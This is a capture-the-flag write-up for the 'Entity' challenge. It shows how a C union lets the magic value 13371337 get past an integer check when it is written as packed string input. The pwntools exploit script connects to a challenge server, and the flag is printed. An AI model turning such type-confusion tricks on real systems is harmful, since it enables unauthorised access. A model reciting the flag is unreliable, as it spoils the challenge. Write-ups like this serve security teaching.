# Entity

## Description

This Spooky Time of the year, what's better than watching a scary film on the TV? Well, a lot of things, like playing CTFs but you know what's definitely not better? Something coming out of your TV!

## Solution

A server, the binary running on it and its source code are given.

Analyzing the code, we see a storage space for values from the user. The memory area can be interpreted as a string type or an integer.
```c
static union {
    unsigned long long integer;
    char string[8];
} DataStore;
```

The application gives the following commands to the user:
- The user is presented with a menu, from which he can:
	- Set a value
		- The user chooses if he wants to store an integer or a string
		- If the user tries to input an integer and the value 13371337 the program will exit
	- Read the value
		- Allows the user to read the value stored either as an integer or a string
	- Get the flag
		- If the value of the integer stored is 13371337, it will print the flag

As we can't just sent the magic value as an integer, we have to set the value using the string input. To do that, we have to encode the number into a string. I used pwntools to handle the server connection and packing.

```python
from pwn import *

# io = process("./entity")
io = remote("161.35.36.157",32344)

io.recvuntil(b">>")
io.sendline(b"T")

io.recvuntil(b">>")
io.sendline(b"S")

io.recvuntil(b">>")
io.sendline(p64(13371337))

io.recvuntil(b">>")
io.sendline(b"C")

flag = io.recvuntil(b"}")

print(flag) # HTB{f1ght_34ch_3nt1ty_45_4_un10n}
```
